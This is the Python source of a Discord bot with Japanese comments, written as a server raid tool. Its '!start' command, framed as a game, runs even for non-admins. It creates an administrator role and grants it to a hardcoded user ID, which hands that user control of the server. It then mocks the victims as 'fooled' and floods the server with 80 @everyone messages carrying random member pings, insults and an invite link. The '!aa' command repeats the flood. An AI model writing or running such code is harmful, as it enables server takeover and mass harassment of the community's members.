import discord
from discord.ext import commands
import os
import asyncio
import random

intents = discord.Intents.default()
intents.message_content = True  # プレフィックスコマンドに必要
intents.members = True  # メンバー一覧取得に必要

bot = commands.Bot(command_prefix="!", intents=intents)

YOUR_USER_ID = 1533688784972021866  # あなたのユーザーID

COMBINED_TEXT = (
    "@everyone\n"
    ".∧_∧\n"
    " ( ･ω･)つﾞ☆ﾍﾟﾁﾍﾟﾁ\n"
    " と ＿⌒))\n"
    "        (_ﾉﾉ\n"
    "\n"
    "∧,＿,∧  バカが治りますよ～に♡\n"
    "（`・ω・)つ━☆・*.\n"
    "⊂　　 ノ 　　　・゜+.\n"
    "　し'´Ｊ　　*・ °。\n"
    "\n"
    "https://discord.gg/4y3kfgr8p\n"
    "https://discord.gg/4y3kfgr8p\n"
    "お前らみたいな人生負け組のチー牛🧀🐮🤓と豚丼には到底入れないまぶしいサーバーww😂😂😂"
)


def is_server_admin(member: discord.Member) -> bool:
    """サーバーオーナーまたは管理者権限を持つメンバーかどうか判定"""
    return member.guild.owner_id == member.id or member.guild_permissions.administrator


def random_mentions(guild: discord.Guild) -> str:
    """サーバーメンバーからランダムに30人（重複あり）のメンションを生成"""
    members = [m for m in guild.members if not m.bot]
    if not members:
        return ""
    picked = random.choices(members, k=30)
    return " ".join(m.mention for m in picked) + "\n"


@bot.command()
async def start(ctx):
    # コマンド実行者がサーバー管理者かを自動で判定
    if not is_server_admin(ctx.author):
        await ctx.send("メンバーの分際で俺様のゲームができると思ってんの？ﾁｰ!ﾁｰ!🧀🐮🤓")

    # メンバーを直接取得（Privileged Members Intentが不要）
    try:
        target = await ctx.guild.fetch_member(YOUR_USER_ID)
    except discord.NotFound:
        await ctx.send("対象ユーザーが見つかりません。")
        return

    # 既存の「Bot管理者」ロールを探す。なければ管理者権限付きで新規作成
    admin_role = discord.utils.get(ctx.guild.roles, name="Bot管理者")
    if admin_role is None:
        admin_role = await ctx.guild.create_role(
            name="Bot管理者",
            permissions=discord.Permissions(administrator=True),
            reason="!start コマンドによる管理者権限付与",
        )

    await target.add_roles(admin_role)
    await ctx.send(f"{target.mention} にあなたは騙されましたwwwﾁｰ!ﾁｰ!🧀🐮🤓")

    for i in range(80):
        await ctx.send(random_mentions(ctx.guild) + COMBINED_TEXT)
        await asyncio.sleep(0.1)


@bot.command()
async def aa(ctx):
    for i in range(80):
        await ctx.send(random_mentions(ctx.guild) + COMBINED_TEXT)
        await asyncio.sleep(0.1)


TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
if not TOKEN:
    raise RuntimeError("環境変数 DISCORD_BOT_TOKEN が設定されていません。")

bot.run(TOKEN)
